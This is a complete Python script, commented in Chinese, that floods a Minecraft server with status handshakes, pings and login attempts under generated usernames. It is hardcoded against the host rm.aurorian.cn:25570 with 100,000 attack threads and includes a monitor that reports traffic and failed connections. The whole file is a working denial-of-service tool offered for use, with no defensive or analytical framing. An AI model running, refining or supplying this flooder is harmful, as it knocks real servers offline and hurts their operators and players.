import socket
import threading
import json
import time
from typing import Tuple

# 全局变量
data = 0
part1 = []
port = 0
hand = b""
login = b""
ping = b""
pack = b""
version = -1
killT = 0
point = 0
text = ""


def read_var_int(sock: socket.socket) -> int:
    """从socket读取VarInt格式数据"""
    i = 0
    j = 0
    while True:
        k = sock.recv(1)
        if not k:
            raise EOFError("连接已关闭")
        k = ord(k)
        i |= (k & 0x7F) << j * 7
        j += 1
        if j > 5:
            raise RuntimeError("VarInt too big (超过5字节)")
        if (k & 0x80) == 0:
            break
    return i


def encode_varint(value: int) -> bytes:
    """安全的VarInt编码（限制最多5字节，避免无限循环）"""
    bytes_list = []
    for _ in range(5):  # Minecraft协议规定VarInt最大5字节
        if (value & 0xFFFFFF80) == 0:
            bytes_list.append(value & 0xFF)
            break
        bytes_list.append((value & 0x7F) | 0x80)
        value >>= 7
    else:
        raise ValueError("VarInt过大（超过5字节限制）")
    return bytes(bytes_list)


def create_packet(data: bytes) -> bytes:
    """创建带长度前缀的数据包（前缀为VarInt格式）"""
    length = encode_varint(len(data))
    return length + data


def recv_all(sock: socket.socket, length: int) -> bytes:
    """确保接收指定长度的字节（解决部分接收问题）"""
    data = b""
    while len(data) < length:
        chunk = sock.recv(length - len(data))
        if not chunk:
            raise EOFError("连接中断，未接收完整数据")
        data += chunk
    return data


class AttackThread(threading.Thread):
    """攻击线程类，负责与服务器建立连接并发送数据包"""
    def run(self) -> None:
        global data, killT, point
        while True:
            try:
                # 第一次连接：握手+状态请求
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((part1[0], port))
                    
                    # 发送握手包
                    s.send(create_packet(hand))
                    # 发送状态请求包
                    s.send(create_packet(pack))
                    
                    # 读取响应
                    length = read_var_int(s)
                    data += length
                    read_var_int(s)  # 数据包ID
                    str_len = read_var_int(s)
                    recv_all(s, str_len)  # 读取服务器信息（不解析，仅计数）
                    
                    # 发送ping包
                    s.send(create_packet(ping))
                    # 读取ping响应
                    length = read_var_int(s)
                    data += length
                    read_var_int(s)  # 数据包ID
                    recv_all(s, 8)  # 读取long类型的时间戳
                
                # 第二次连接：登录流程
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((part1[0], port))
                    s.settimeout(1.5)
                    
                    # 发送登录握手
                    s.send(create_packet(login))
                    
                    # 创建并发送用户名包
                    username = f"{text}{point}"
                    point += 1
                    username_data = b"\x00"  # 包ID：登录开始
                    username_data += encode_varint(len(username))  # 用户名长度
                    username_data += username.encode('utf-8')  # 用户名内容
                    
                    s.send(create_packet(username_data))
                    
                    # 读取所有可能的响应
                    while True:
                        try:
                            length = read_var_int(s)
                            data += length
                            recv_all(s, length)  # 确保接收完整
                        except (socket.timeout, EOFError):
                            break
                            
            except Exception:
                killT += 1


class MonitorThread(threading.Thread):
    """监控线程，定期输出统计信息"""
    def run(self) -> None:
        global data, killT
        while True:
            time.sleep(3)
            if data >= 1024 * 1024 * 1024:
                size = data / (1024.0 * 1024.0 * 1024.0)
                unit = "gb"
            elif data >= 1024 * 1024:
                size = data / (1024.0 * 1024.0)
                unit = "mb"
            elif data >= 1024:
                size = data / 1024.0
                unit = "kb"
            else:
                size = data
                unit = "byte"
            print(f"[监控线程]>{size:.2f}{unit},{killT}次连接失败")


def detect_server_version() -> Tuple[bool, int]:
    """探测服务器版本和协议号（优化数据接收和错误处理）"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)  # 设置超时，避免卡壳
            s.connect((part1[0], port))
            
            # 发送握手包和状态请求
            s.send(create_packet(hand))
            s.send(create_packet(pack))
            
            # 读取响应（确保完整接收）
            length = read_var_int(s)
            global data
            data += length
            read_var_int(s)  # 数据包ID
            str_len = read_var_int(s)
            # 关键修复：使用recv_all确保获取完整的MOTD字符串
            motd_bytes = recv_all(s, str_len)
            motd = motd_bytes.decode('utf-8', errors='replace')  # 忽略解码错误
            
            # 尝试解析JSON，若失败则输出原始数据帮助调试
            try:
                motd_json = json.loads(motd)
                version_name = motd_json["version"]["name"]
                protocol_version = motd_json["version"]["protocol"]
                print(f"服务器版本:{version_name},协议版本号:{protocol_version}")
                return True, protocol_version
            except json.JSONDecodeError:
                print(f"JSON解析失败，原始数据: {motd[:200]}...")  # 只显示前200字符
                return False, -1
    except Exception as e:
        print(f"版本探测失败: {str(e)}")
        return False, -1


def main():
    global part1, port, hand, ping, pack, login, version, text

    # 获取用户输入
    #ip = input("请输入服务器地址(格式:IP:端口，如127.0.0.1:25565):")
    #thread_num = input("请输入线程数量(建议从100开始测试):")
    #text = input("请输入干扰字符(英文/数字，不要太长):")
    ip="rm.aurorian.cn:25570"
    thread_num = 100000
    text="TEST"*10
    
    # 解析服务器地址
    part1 = ip.split(":")
    if len(part1) != 2:
        print("地址格式错误！必须包含端口(如127.0.0.1:25565)")
        return
    try:
        port = int(part1[1])
        num = int(thread_num)
        if num <= 0:
            raise ValueError
    except ValueError:
        print("端口和线程数量必须是正整数！")
        return
    
    print("正在初始化数据包...")
    
    # 初始化握手包（状态请求阶段）
    ip_str = part1[0]
    hand_data = b"\x00"  # 包ID：握手
    hand_data += encode_varint(0)  # 临时版本号（后续会更新）
    hand_data += encode_varint(len(ip_str))  # IP长度
    hand_data += ip_str.encode('utf-8')  # IP地址
    hand_data += port.to_bytes(2, byteorder='big')  # 端口（大端序short）
    hand_data += encode_varint(1)  # 状态：1=状态请求
    hand = hand_data
    
    # 初始化状态请求包
    pack = b"\x00"  # 包ID：请求服务器状态
    
    # 初始化Ping包
    ping_data = b"\x01"  # 包ID：Ping
    ping_data += (0x7FFFFFFFFFFFFFFF).to_bytes(8, byteorder='big')  # 最大long值
    ping = ping_data
    
    # 探测服务器版本
    print("正在探测服务器版本...")
    success, detected_version = detect_server_version()
    if success:
        version = detected_version
        confirm = input("是否使用探测到的协议版本号？[y/n]:")
        if confirm.lower() != 'y':
            version = int(input("请手动输入协议版本号:"))
    else:
        # 若探测失败，可根据常见版本号提示用户（如1.21.x协议号通常为772）
        print("常见协议版本参考: 1.18.2=758, 1.19.4=760, 1.20.1=760, 1.21=767, 1.21.8=772")
        version = int(input("请手动输入协议版本号:"))
    
    # 初始化登录阶段握手包
    login_data = b"\x00"  # 包ID：握手
    login_data += encode_varint(version)  # 正确的协议版本号
    login_data += encode_varint(len(ip_str))  # IP长度
    login_data += ip_str.encode('utf-8')  # IP地址
    login_data += port.to_bytes(2, byteorder='big')  # 端口
    login_data += encode_varint(2)  # 状态：2=登录
    login = login_data
    
    print("准备就绪，正在启动线程...")
    print("提示：长时间显示0byte可能表示攻击失败")
    
    # 启动监控线程
    monitor = MonitorThread()
    monitor.daemon = True
    monitor.start()
    
    # 启动攻击线程
    for _ in range(num):
        thread = AttackThread()
        thread.daemon = True
        thread.start()
        time.sleep(0.01)  # 避免瞬间创建过多线程
    
    # 保持主线程运行
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n用户终止程序")


if __name__ == "__main__":
    main()